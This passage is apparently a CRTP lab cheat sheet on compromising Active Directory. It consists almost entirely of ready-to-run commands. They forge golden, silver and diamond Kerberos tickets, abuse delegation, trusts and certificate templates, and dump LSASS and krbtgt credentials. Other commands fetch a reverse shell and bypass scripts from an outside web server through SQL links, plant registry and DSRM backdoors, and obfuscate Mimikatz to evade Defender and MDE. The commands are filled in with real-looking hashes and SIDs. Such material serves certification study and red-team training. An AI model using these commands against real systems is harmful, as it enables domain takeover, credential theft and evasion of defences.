# /ldap queries DC for user info (logoncount, pwdlastset, groups, etc.)
# /printcmd outputs complete command with all realistic values
```

**Step 2: Run the generated command with /ppt to inject ticket**
```powershell
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
  -args evasive-golden 
    /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
    /user:Administrator 
    /id:500 
    /domain:dollarcorp.moneycorp.local 
    /sid:S-1-5-21-719815819-3726368948-3917688648 
    /pwdlastset:"11/11/2022 6:34:22 AM"
    /minpassage:1 
    /logoncount:152 
    /netbios:dcorp 
    /groups:544,512,520,513 
    /dc:DCORP-DC.dollarcorp.moneycorp.local 
    /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD 
    /ppt

# Ticket injected into current process
```

#### Using Golden Ticket for DC Access
```powershell
# Ticket is now in Kerberos cache, can access any domain resource
C:\AD\Tools> winrs -r:dcorp-dc cmd
# Executes commands on DC as Administrator
```

**Key Command Parameters:**
- `pwdlastset`: Date krbtgt password was changed (use realistic date)
- `minpassage`: Minimum password age (typically 1)
- `logoncount`: Realistic logon count (use actual value from /ldap query)
- `groups`: Proper group membership (544=BUILTIN\Admins, 512=DA, 520=Enterprise Admins, 513=Users)
- `/ldap`: Automatically retrieve user info from DC
- `/printcmd`: Output command with all parameters for review
- `/ppt`: Inject ticket into current process (Pass-The-Ticket)

---

### Silver Ticket for WinRM (HTTP Service)
```powershell
# Obtain machine account hash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
  -args "sekurlsa::evasive-keys" "exit"

# Create silver ticket for HTTP service
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
  -args evasive-silver 
    /service:http/dcorp-dc.domain.com 
    /rc4:c6a60b67476b36ad7838d7875c33c2c3 
    /sid:S-1-5-21-719815819-3726368948-3917688648 
    /user:Administrator 
    /domain:dollarcorp.moneycorp.local 
    /ldap 
    /ptt

# Access WinRM
winrs -r:dcorp-dc.domain.com cmd
```

### Silver Ticket for WMI (HOST + RPCSS)
```powershell
# Create two tickets (both required for WMI)

# Host ticket
Rubeus evasive-silver /service:host/dcorp-dc.domain.com ...

# RPCSS ticket
Rubeus evasive-silver /service:rpcss/dcorp-dc.domain.com ...

# Use for WMI
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
```

---

### Diamond Ticket (Hybrid Approach)
```powershell
# Legitimate TGT + Forged PAC
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
  -args diamond 
    /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
    /tgtdeleg 
    /enctype:aes 
    /ticketuser:administrator 
    /domain:dollarcorp.moneycorp.local 
    /dc:dcorp-dc.domain.com 
    /ticketuserid:500 
    /groups:512 
    /createnetonly:C:\Windows\System32\cmd.exe 
    /show 
    /ppt
```

**Advantages:**
- Avoids time-based detection of golden tickets
- Hybrid approach using legitimate TGT mechanism
- Forged PAC element still provides escalation

---

### Constrained Delegation - S4U Attacks (User Account)

#### Detection
```powershell
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto

# Output: websvc user with CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL in delegation
```

#### Exploitation (S4U2self → S4U2proxy)
```powershell
# Prerequisite: Have AES256 key of constrained delegation user (websvc)
# Objective: Impersonate Administrator to access CIFS on dcorp-mssql

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
  -args s4u 
    /user:websvc 
    /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 
    /impersonateuser:Administrator 
    /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" 
    /ppt

# Result: 
# 1. S4U2self: Get TGS for Administrator to websvc
# 2. S4U2proxy: Use that TGS to request CIFS/dcorp-mssql TGS
# 3. Access: dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

**Key Mechanics:**
- S4U2self: Request service ticket on behalf of user without needing their password
- S4U2proxy: Use S4U2self ticket to request service ticket for delegated service
- Requires: Original user account credentials or keys, target user, delegated SPN

---

### Constrained Delegation - S4U with Alternate Service (LDAP for DCSync)

#### Detection of Computer with Constrained Delegation
```powershell
Get-DomainComputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto

# Output: DCORP-ADMINSRV$ with TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL delegation
```

#### Exploitation with Service Substitution
```powershell
# Prerequisite: AES256 of machine account (dcorp-adminsrv$)
# Key Technique: /altservice:ldap substitutes original service with LDAP

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
  -args s4u 
    /user:dcorp-adminsrv$ 
    /aes256:1f556f9d4e5fcab7f1bf4730180eb1efd0fadd5bb1b5c1e810149f9016a7284d 
    /impersonateuser:Administrator 
    /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL 
    /altservice:ldap 
    /ptt

# Result: LDAP/dcorp-dc TGS as Administrator
```

#### Using TGS for DCSync
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
  -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"

# Works because we have LDAP service ticket as Administrator
```

**Advantage:**
- Service substitution lets you request different service (LDAP) than delegated service (TIME)
- LDAP access equals admin access on DC
- Effective for machines delegated to non-LDAP services

---

### Resource-Based Constrained Delegation (RBCD)

#### Prerequisites
- Write permissions on target computer object (GenericWrite, AllExtendedRights)
- Machine account credentials/keys of delegating machine

#### Enumeration
```powershell
# Find computer where we have write permissions
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}

# Output: ciadmin has GenericWrite on DCORP-MGMT computer
```

#### Exploitation Steps

**Step 1: Set RBCD Configuration**
```powershell
# Set dcorp-studentx$ to delegate to dcorp-mgmt
Set-DomainRBCD -Identity dcorp-mgmt 
  -DelegateFrom 'dcorp-studentx$' 
  -Verbose

# Verify
Get-DomainRBCD
```

**Step 2: Extract Machine Account Keys**
```powershell
# Get AES256 of delegating machine (dcorp-studentx$)
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe 
  -args "sekurlsa::evasive-keys" "exit"

# Extract: aes256_hmac for DCORP-STUDENTX$
```

**Step 3: Abuse RBCD**
```powershell
# Use machine account to request service ticket to target as Administrator
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
  -args s4u 
    /user:dcorp-studentx$ 
    /aes256:bd05cafc205970c1164eb65abe7c2873dbfacc3dd790821505e0ed3a05cf23cb 
    /msdsspn:http/dcorp-mgmt 
    /impersonateuser:administrator 
    /ptt

# Access
winrs -r:dcorp-mgmt cmd
```

**Why RBCD Over Constrained Delegation:**
- No need for delegation configuration in user/computer attributes
- Can modify RBCD if we have write permissions on target
- More flexible: can delegate from any machine
- Works with modern environments

---

## SECTION 6: CROSS-DOMAIN & CROSS-FOREST ATTACKS

### Inter-Realm TGT (Parent Domain Compromise)

#### Extract Trust Key
```powershell
# From child domain DC with DA access
SafetyKatz "lsadump::trust /patch"

# Output: Trust keys for all trusts
# Look for: PARENT.LOCAL trust entry with AES256 key
```

#### Create Referral Ticket
```powershell
# Using trust key to forge inter-realm ticket
Rubeus evasive-silver 
  /service:krbtgt/CHILD.PARENT.LOCAL
  /rc4:trust_key_rc4
  /sid:S-1-5-21-[CHILD-SID]
  /user:Administrator
  /domain:child.parent.local
  /nowrap
```

#### Request TGS for Parent Domain Service
```powershell
# Request service ticket in parent domain
Rubeus asktgs 
  /service:http/parent-dc.parent.local
  /dc:parent-dc.parent.local
  /ptt 
  /ticket:[referral_ticket_base64]
```

#### SID History Alternative (if available)
```powershell
# If not restricted by SID filtering
Rubeus evasive-golden 
  /user:Administrator
  /id:500
  /domain:child.parent.local
  /sid:S-1-5-21-[CHILD-SID]
  /sids:S-1-5-21-[PARENT-SID]-519  # Enterprise Admins in parent
  /aes256:child_krbtgt_hash
  /netbios:child
  /ppt
```

### External Trust Abuse

#### Constraints
- SID Filtering ENABLED (can't add arbitrary SIDs)
- Only trusted groups allowed
- One-way trusts limit options

#### Steps
```powershell
# 1. Extract trust key
SafetyKatz "lsadump::trust /patch"

# 2. Create referral to external domain
Rubeus evasive-silver 
  /service:krbtgt/EXTERNAL.LOCAL
  /rc4:external_trust_hash
  /sid:S-1-5-21-[EXTERNAL-SID]
  /user:Administrator
  /domain:current.local

# 3. Request TGS for external resource
Rubeus asktgs 
  /service:cifs/external-dc.external.local
  /dc:external-dc.external.local
  /ticket:[referral]
  /ppt

# 4. Access explicitly shared resources only
dir \\external-dc.external.local\SharedWithCurrentDomain
```

---

## SECTION 7: SQL SERVER EXPLOITATION

### Database Link Enumeration
```sql
-- List linked servers
select * from master..sysservers

-- Query through link
select * from openquery("LINKED_SERVER", 'select @@servername')

-- Test xp_cmdshell availability
select * from openquery("LINKED_SERVER", 'select @@version')
```

### Automated Link Crawling
```powershell
# PowerUpSQL automated crawling
Get-SQLServerLinkCrawl -Instance dcorp-mssql.domain.com -Verbose

# Output:
# Server: DCORP-MSSQL (StudentX, not sysadmin)
#   → Links to: DCORP-SQL1
# Server: DCORP-SQL1 (dblinkuser, not sysadmin)
#   → Links to: DCORP-MGMT
# Server: DCORP-MGMT (sqluser, not sysadmin)
#   → Links to: eu-sqlx.eu.eurocorp.local
# Server: eu-sqlx (sa, SYSADMIN!)
#   → No further links
```

### Command Execution Through Links
```powershell
# Direct nested query (complex escaping)
select * from openquery("DCORP-SQL1",
  'select * from openquery("DCORP-MGMT",
    ''select * from openquery("eu-sqlx",
      ''''exec master..xp_cmdshell "whoami"'''')'')')

# PowerUpSQL automated approach (RECOMMENDED)
Get-SQLServerLinkCrawl -Instance dcorp-mssql 
  -Query 'exec master..xp_cmdshell "whoami"' 
  -QueryTarget eu-sqlx
```

### Reverse Shell Delivery Through SQL
```powershell
# Prepare reverse shell script on attacker web server
# Content: Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.x -Port 443

# Deliver through SQL link
Get-SQLServerLinkCrawl -Instance dcorp-mssql 
  -Query 'exec master..xp_cmdshell 
    ''powershell -c "iex (iwr http://172.16.100.x/shell.ps1)"''' 
  -QueryTarget eu-sqlx

# Listener captures shell from eu-sqlx as SYSTEM
```

---

## SECTION 8: ACTIVE DIRECTORY CERTIFICATE SERVICES

### ESC1 - Vulnerable Certificate Template

**Vulnerability Requirements:**
- Template allows `ENROLLEE_SUPPLIES_SUBJECT`
- Has Client Authentication EKU
- User has enrollment rights

#### Exploitation
```powershell
# 1. Find vulnerable templates
Certify.exe find /enrolleeSuppliesSubject

# 2. Request cert for DA
Certify.exe request 
  /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
  /template:HTTPSCertificates
  /altname:administrator
  /sid:S-1-5-21-335606122-960912869-3279953914-500

# 3. Convert to PFX (interactive password)
openssl.exe pkcs12 
  -in cert.pem 
  -keyex 
  -CSP "Microsoft Enhanced Cryptographic Provider v1.0"
  -export 
  -out cert.pfx

# 4. Request TGT with certificate
Rubeus.exe asktgt 
  /user:Administrator
  /certificate:cert.pfx
  /password:password
  /ptt

# 5. Verify DA access
winrs -r:dc cmd
```

### ESC3 - Enrollment Agent + Signed Requests

**Vulnerability Requirements:**
- ESC3a: Enrollment Agent template with user rights
- ESC3b: Signed request template

#### Exploitation
```powershell
# 1. Request Enrollment Agent certificate
Certify.exe request 
  /ca:ca-server\ca-name
  /template:SmartCardEnrollment-Agent

# 2. Convert agent cert to PFX
openssl.exe pkcs12 -in agent.pem ... -out agent.pfx

# 3. Use agent cert to request target cert
Certify.exe request 
  /ca:ca-server\ca-name
  /template:SmartCardEnrollment-Users
  /onbehalfof:domain\Administrator
  /enrollcert:agent.pfx
  /enrollcertpw:password

# 4. Convert target cert to PFX
openssl.exe pkcs12 -in target.pem ... -out target.pfx

# 5. Request TGT with target cert
Rubeus.exe asktgt 
  /user:Administrator
  /certificate:target.pfx
  /password:password
  /ptt

# Result: DA access via certificate authentication
```

---

## SECTION 8b: SECURITY DESCRIPTOR MODIFICATION

### WMI Namespace Access via Descriptor Modification

#### Prerequisites
- Domain Admin privileges on target (for initial modification)
- RACE.ps1 module

#### Modification Steps
```powershell
# As DA, grant user access to WMI namespace
. C:\AD\Tools\RACE.ps1
Set-RemoteWMI -SamAccountName studentx 
  -ComputerName dcorp-dc 
  -namespace 'root\cimv2' 
  -Verbose

# New ACL allows studentx to query WMI
```

#### Exploitation (As Non-Admin User)
```powershell
# Now studentx can query WMI without admin privileges
gwmi -class win32_operatingsystem -ComputerName dcorp-dc

# Works for credential dumping or system reconnaissance
```

### PowerShell Remoting Access via Descriptor Modification

```powershell
# As DA, modify PSRemoting ACL
Set-RemotePSRemoting -SamAccountName studentx 
  -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
  -Verbose

# As studentx, now can run commands
Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc
```

### Machine Account Hash Extraction via Registry Backdoor

**Objective:** Extract machine account hash without DA privileges on DC

**Step 1: Create Registry Backdoor (requires DA on student VM)**
```powershell
# Start DA process
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
  -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 
    /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# In DA process, create registry backdoor
C:\Windows\system32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
PS C:\Windows\system32> . C:\AD\Tools\RACE.ps1
PS C:\Windows\system32> Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
  -Trustee studentx 
  -Verbose

# Output shows backdoor created:
# - Remote registry service started
# - ACE added to winreg key with ALL_ACCESS (983103)
# - studentx can now read registry
```

**Step 2: Extract Machine Account Hash (as non-DA user)**
```powershell
# Now run as studentx (can be unprivileged domain user)
C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
PS C:\AD\Tools> . C:\AD\Tools\RACE.ps1
PS C:\AD\Tools> Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose

# Output:
# ComputerName       MachineAccountHash
# dcorp-dc           1be12164a06b817e834eb437dc8f581c
```

**Step 3: Use Machine Account Hash for Silver Tickets**
```powershell
# Create HOST service ticket (for WMI initial connection)
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
  -args evasive-silver 
    /service:host/dcorp-dc.dollarcorp.moneycorp.local 
    /rc4:1be12164a06b817e834eb437dc8f581c 
    /sid:S-1-5-21-719815819-3726368948-3917688648 
    /ldap 
    /user:Administrator 
    /domain:dollarcorp.moneycorp.local 
    /ppt

# Create RPCSS service ticket (for WMI method execution)
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
  -args evasive-silver 
    /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local 
    /rc4:1be12164a06b817e834eb437dc8f581c 
    /sid:S-1-5-21-719815819-3726368948-3917688648 
    /ldap 
    /user:Administrator 
    /domain:dollarcorp.moneycorp.local 
    /ppt

# Execute WMI queries with machine account privileges
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
```

**Use Case:** 
- Non-DA user gains DC WMI access after DA creates backdoor
- No need for DA privileges after backdoor is established
- Persists across logoffs
- Requires registry access (enabled via RACE.ps1 backdoor)

---

## SECTION 9: PERSISTENCE MECHANISMS

### DSRM Administrator Abuse (DC Persistence)

**Use Case:** Maintain persistent admin access to DC even after password reset

#### Step 1: Extract DSRM Administrator Hash
```powershell
# From DC with DA privileges (requires local SYSTEM access on DC)
C:\Users\svcadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe 
  -args "token::elevate" "lsadump::evasive-sam" "exit"

# Output: Administrator (DSRM) NTLM hash
# Example: a102ad5753f4c441e3af31c97fad86fd
```

#### Step 2: Enable Network Logon for DSRM
```powershell
# By default, DSRM admin can only logon locally
# From DC command session, modify registry:
C:\Users\svcadmin> reg add "HKLM\System\CurrentControlSet\Control\Lsa" 
  /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f

# Value meanings:
# 0 = Deny network logon (default, most secure)
# 1 = Local logon only
# 2 = Network logon allowed (enables persistence)
```

#### Step 3: Use DSRM Hash for Persistence

**From Student VM (elevated shell):**
```powershell
# Pass-the-Hash with DSRM admin NTLM (not OverPass-the-Hash)
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
  -args "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator 
    /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"

# New process spawned with DSRM admin NTLM hash cached
```

#### Step 4: Connect to DC via PowerShell Remoting

**Configure TrustedHosts (required for NTLM auth):**
```powershell
PS C:\Windows\system32> Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
PS C:\Windows\system32> Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Concatenate
```

**Connect from new process (with DSRM hash):**
```powershell
PS C:\Windows\system32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
PS C:\AD\Tools> Enter-PSSession -ComputerName 172.16.2.1 
  -Authentication NegotiateWithImplicitCredential

# Connected as DSRM Administrator on DC
[172.16.2.1]: PS C:\Users\Administrator.DCORP-DC\Documents> $env:username
Administrator
```

**Key Differences from Golden Tickets:**
- DSRM is local DC account, not Kerberos-based
- Requires NTLM pass-the-hash (not AES256/Kerberos)
- Works even if krbtgt is changed
- Survives krbtgt password rotation (DA persistence guarantee)

---

## SECTION 10: EVASION & OBFUSCATION TECHNIQUES

### Custom Loader Development

**Purpose:** Bypass Windows Defender/MDE detection

#### Source Code Obfuscation
```
1. Download Visual Studio + .NET SDK
2. Create Console Application (.NET Framework)
3. Copy NetLoader source code
4. Disable debugging information (Properties → Build → Advanced)
5. Use Codecepticon for obfuscation:
   Codecepticon.exe --action obfuscate --module csharp 
     --path "project.sln" --rename fv 
     --string-rewrite --string-rewrite-method xor
```

#### Post-Compilation Obfuscation
```
1. Compile obfuscated project
2. Use ConfuserEx 2 for additional protection:
   - Add assembly in GUI
   - Create rule with protections:
     * Ctrl Flow Protection
     * String Encryption
     * Resource Encryption
   - Click Protect
```

### Custom Invoke-Mimikatz

#### Mimikatz Source Modifications
```
1. Remove all comments (use CppCommentRemover tool)
2. Remove sqlite3.c/sqlite3.h (browser credential extraction)
3. Remove dpapi_chrome module
4. Obfuscate command names:
   - Instead of: sekurlsa::logonpasswords
   - Use: sekurlsa::custom-logonpasswords
5. Build powerkatz.dll (Second_PowerShell_Release config)
```

#### PowerShell Script Encryption
```powershell
# 1. Generate random AES256 key
$key = [Convert]::ToBase64String((New-RandomBytes 32))

# 2. Encrypt base64-encoded powerkatz
# Use CustomAES-Generator-Encryption.ps1

# 3. Add decryption routine to Invoke-Mimikatz
function Decrypt-Base64AES256 {
  param([string]$TokenB64, [string]$KeyB64)
  # [Decryption implementation]
}

# 4. Replace $PEBytes64 with:
Decrypt-Base64AES256 -TokenB64 $AESenc64 -KeyB64 $keyB64

# 5. Remove comments from script
# Find: #.*$ (regex)
# Replace with nothing

# 6. Remove initial comment block (<# ... #>)

# 7. Obfuscate with Codecepticon:
Codecepticon.exe --action obfuscate --module powershell 
  --path "Invoke-Mimikatz.ps1" 
  --save-as "Invoke-TheKat.ps1" 
  --rename all --rename-method markov
```

### AMSI & Logging Bypass

**Use Case:** Bypass defenses when running PowerShell tools (PowerView, Mimikatz scripts) in reverse shells or remote sessions.

#### Script Block Logging Bypass
```powershell
# Disable Enhanced Script Block Logging at runtime
iex (New-Object System.NET.WebClient).DownloadString('http://server/sbloggingbypass.txt')

# This must run BEFORE any tool execution to avoid detection of tool import
```

#### AMSI Bypass
```powershell
# Runtime AMSI bypass (must run AFTER Script Block Logging bypass)
iex (New-Object System.NET.WebClient).DownloadString('http://server/Amsi-Byp.txt')

# Enables running of sensitive tools without AMSI detection
```

#### Constrained Language Mode (CLM) Bypass for Applocker-Protected Machines

**Problem:** PSRemoting into Applocker-protected machines drops to Constrained Language Mode, preventing:
- Dot-sourcing (. .\script.ps1)
- Dynamic code execution
- Module loading

**Solution:** Embed function call directly in script

```powershell
# Original (FAILS in CLM):
# . .\Invoke-Mimikatz.ps1
# Invoke-Mimikatz -Command "sekurlsa::evasive-keys"

# Modified for CLM (WORKS):
# Copy entire Invoke-Mimikatz function definition into script
# Add direct function call at END of script file:
Invoke-Mimikatz -Command "sekurlsa::evasive-keys"

# Create as: Invoke-TheKatEx-keys.ps1
# Copy to: C:\Program Files\Invoke-TheKatEx-keys.ps1 (bypasses Applocker)
# Run from PSRemoting session: .\Invoke-TheKatEx-keys.ps1
```

**Why This Works:**
- Applocker default rule: Everyone allowed to run scripts in %PROGRAMFILES%\*
- No dot-sourcing = No dot-sourcing detection by CLM
- Function embedded in file = No external dot-sourcing dependency
- Direct invocation at script end = Executes without CLM restrictions

### Lateral Movement Evasion

#### WSManWinRM Alternative (vs winrs detection)
```powershell
# Instead of winrs (detected by MDI)
C:\AD\Tools\WSManWinRM.exe eu-sqlx.domain.com 
  "cmd /c whoami > \\attacker\share\out.txt"

# Set ASR exclusion for detection bypass:
# Add "C:\AD\Tools" to ASR exclusion list
```

### MDE/MDI Bypass for LSASS Dumping

#### Problem
- Traditional minidump (Mimikatz/SafetyKatz) is detected by MDE
- Memory dumping triggers behavioral analysis

#### Solution: Custom API Implementation (minidumpdotnet.dll)

**Why It Works:**
- Uses custom implementation of MiniDumpWriteDump() API
- Avoids public known signatures
- Not chain-detected when delivered via SMB

#### Delivery & Execution
```powershell
# Host minidumpdotnet.dll and supporting scripts on SMB share
# \\studentvm\studentsharex\mini.ps1
# \\studentvm\studentsharex\minidumpdotnet.dll
# \\studentvm\studentsharex\reverse.exe

# Execute via SQL link (can reach cross-forest if database links available)
Get-SQLServerLinkCrawl -Instance dcorp-mssql 
  -Query 'exec master..xp_cmdshell ''xcopy \\studentvm\studentsharex\mini.ps1 C:\Users\Public''' 
  -QueryTarget eu-sqlx

# Then execute the dump script
Get-SQLServerLinkCrawl -Instance dcorp-mssql 
  -Query 'exec master..xp_cmdshell ''powershell -ep bypass C:\Users\Public\mini.ps1''' 
  -QueryTarget eu-sqlx

# Execute reverse shell on attacker listener
```

#### Reverse Dump Pattern
```
1. Dump LSASS to file using custom API (undetected)
2. Transfer dump file over SMB (less likely detected)
3. Reverse/XOR the dump file before sending (added obfuscation)
4. Parse dump locally with Mimikatz (outside protected environment)
```

**Advantage:** Avoids real-time memory scanning on source machine

#### AMSI & Script Block Logging Bypass Sequence
```powershell
# Chain multiple bypasses before loading tools
iex (New-Object System.NET.WebClient).DownloadString('http://server/sbloggingbypass.txt')
iex (New-Object System.NET.WebClient).DownloadString('http://server/Amsi-Byp.txt')
iex (New-Object System.NET.WebClient).DownloadString('http://server/PowerUpSQL.ps1')

# Now use PowerUpSQL for database operations without detection
```

---

## SECTION 11: TOOLS COMMAND REFERENCE

### PowerView Comprehensive Reference
```powershell
# Enumeration
Get-Domain                                    # Domain info
Get-DomainUser | select samaccountname        # All users
Get-DomainComputer | select dnshostname       # All computers
Get-DomainGroup -Identity "Domain Admins"   # Specific group
Get-DomainGroupMember -Identity "DA"        # Group members
Get-DomainOU                                  # All OUs
Get-DomainOU -Identity "DevOps"              # Specific OU
Get-DomainGPO                                 # All GPOs
Get-DomainTrust                               # Domain trusts
Get-ForestDomain                              # All domains in forest

# ACL Analysis
Get-DomainObjectAcl -Identity "user" -ResolveGUIDs
Find-InterestingDomainACL -ResolveGUIDs
Find-InterestingDomainACL | ?{$_.IdentityReferenceName -match "group"}

# Delegation
Get-DomainUser -TrustedToAuth                # Constrained delegation users
Get-DomainComputer -TrustedToAuth            # Constrained delegation computers
Get-DomainComputer -Unconstrained            # Unconstrained delegation
Get-DomainRBCD                                # RBCD configurations

# User Location
Find-DomainUserLocation                       # Find user sessions
Invoke-SessionHunter -NoPortScan              # Hunt active sessions

# File Shares
Find-DomainShare                              # Enumerate shares
```

### Rubeus Command Library
```powershell
# Reconnaissance
Rubeus kerberoast /user:target /simple /rc4opsec /outfile:hashes.txt

# OverPass-the-Hash
Rubeus asktgt /user:username /ntlm:hash /opsec /createnetonly:cmd.exe /show /ptt
Rubeus asktgt /user:username /aes256:hash /opsec /createnetonly:cmd.exe /show /ptt

# Constrained Delegation (S4U)
Rubeus s4u /user:account /aes256:hash /impersonateuser:Administrator 
  /msdsspn:CIFS/target /ptt

# RBCD
Rubeus s4u /user:student_machine$ /aes256:hash /msdsspn:http/target 
  /impersonateuser:Administrator /ptt

# Golden Ticket
Rubeus evasive-golden /aes256:krbtgt_hash /user:Administrator /id:500 
  /domain:domain.com /sid:S-1-5-21-X-X-X /groups:544,512,520,513 /ppt

# Silver Ticket
Rubeus evasive-silver /service:http/dc.domain.com /rc4:machine_hash 
  /user:Administrator /domain:domain.com /ppt

# Inter-Realm
Rubeus evasive-silver /service:krbtgt/parent.local /rc4:trust_hash 
  /user:Administrator /domain:child.parent.local /ppt

# Monitor for TGTs
Rubeus monitor /targetuser:DC$ /interval:5 /nowrap

# Import/Use Tickets
Rubeus ppt /ticket:[base64_kirbi]
Rubeus asktgs /service:http/dc /ticket:[referral] /ppt

# Diamond Ticket
Rubeus diamond /krbkey:krbtgt_hash /tgtdeleg /enctype:aes 
  /user:Administrator /domain:domain.com /ppt
```

### SafetyKatz Command Reference
```
sekurlsa::evasive-keys          # Kerberos keys + NTLM
sekurlsa::evasive-logonpasswords # Plaintext passwords
sekurlsa::minidump              # LSASS dump
lsadump::sam                    # Local SAM hashes
lsadump::lsa /patch             # Registry hive extraction
lsadump::dcsync /user:krbtgt    # DCSync attack
lsadump::trust /patch           # Extract trust keys
vault::cred /patch              # Credential Vault extraction
token::elevate                  # Elevate to SYSTEM
```

### PowerUpSQL Reference
```powershell
Get-SQLInstanceDomain           # Enumerate SQL instances
Get-SQLServerinfo               # SQL server version & permissions
Get-SQLServerLinkCrawl          # Crawl database links
Get-SQLServerLinkCrawl -Instance server -Query "cmd"  # Execute through links
Invoke-SQLOSCmd                 # Execute commands via xp_cmdshell
```

### Certify Reference
```
Certify.exe cas                 # Find CAs
Certify.exe find                # Find certificate templates
Certify.exe find /vulnerable    # Find vulnerable templates
Certify.exe find /enrolleeSuppliesSubject  # ESC1 templates
Certify.exe request /ca:ca /template:name /altname:user  # Request cert
```

---

## SECTION 12: ATTACK DECISION FLOWCHART

```
┌─ START: Compromised User (Domain User)
│
├─→ [Local Privilege Escalation]
│   Find-PSRemotingLocalAdminAccess → Machine with admin access?
│   YES → Extract LSASS/Vault → New credentials
│   NO → Continue below
│
├─→ [ACL Analysis]
│   Find-InterestingDomainACL → Interesting permissions?
│   YES → Exploit ACL (GenericAll/WriteDACL/etc) → Privilege escalation
│   NO → Continue below
│
├─→ [Kerberoasting]
│   Get-DomainUser -SPN → Service accounts?
│   YES → Rubeus kerberoast → Crack hash → Get service account
│   NO → Continue below
│
├─→ [Database Exploitation]
│   Get-SQLInstanceDomain → SQL servers accessible?
│   YES → Get-SQLServerLinkCrawl → Admin on linked server?
│   YES → Execute commands, get reverse shell → Lateral movement
│   NO → Continue below
│
├─→ [Delegation Abuse]
│   Get-DomainUser -TrustedToAuth → Constrained delegation?
│   YES → Rubeus S4U → Impersonate admin → Access delegated service
│   NO → Get-DomainComputer -Unconstrained → Unconstrained delegation?
│   YES → Force auth (Printer Bug/WSP/DFS) → Capture TGT → DCSync
│   NO → Continue below
│
├─→ [Certificate Abuse]
│   Certify.exe find /enrolleeSuppliesSubject → ESC1 vulnerable?
│   YES → Certify request for DA → Convert to PFX → Rubeus asktgt
│   NO → Certify find /vulnerable → ESC3 vulnerable?
│   YES → Request enrollment agent → Use agent for target cert
│   NO → Continue below
│
├─→ [Trust Exploitation]
│   Get-DomainTrust → External trust or parent domain?
│   YES → Extract trust key → Create inter-realm referral → Access parent

└─ [DOMAIN ADMIN ACHIEVED]
    ↓
    [Extract krbtgt + all domain hashes]
    ↓
    [Cross-Forest or External Trust → ENTERPRISE ADMIN]
```

---

## SECTION 13: OPSE CONSIDERATIONS BY TECHNIQUE

| Technique | Evasion Need | Mitigation |
|-----------|-------------|-----------|
| Kerberoasting | High | /rc4opsec, time spread, compromised machine |
| LSASS Dump | Very High | minidumpdotnet, reverse.exe, SMB transfer |
| DCSync | High | Use during maintenance window, from DA machine |
| Silver Ticket | Medium | Use realistic timestamps, avoid overuse |
| Golden Ticket | Medium | Realistic pwdlastset, avoid time anomalies |
| Unconstrained Delegation | Medium | Multiple coercion methods available |
| GPO Abuse | Medium | NTLM relay avoids direct detection, log cleanup |
| SQL Exploitation | Low | Commands via links harder to trace |
| Certificate Abuse | Low | Use legitimate enrollment process |
| Database Links | Low | Normal database activity pattern |

---

**Document Version:** 2.0 - Enhanced  
**Last Updated:** 2026-10-07  
**Scope:** Complete CRTP Lab Coverage with Implementation Details
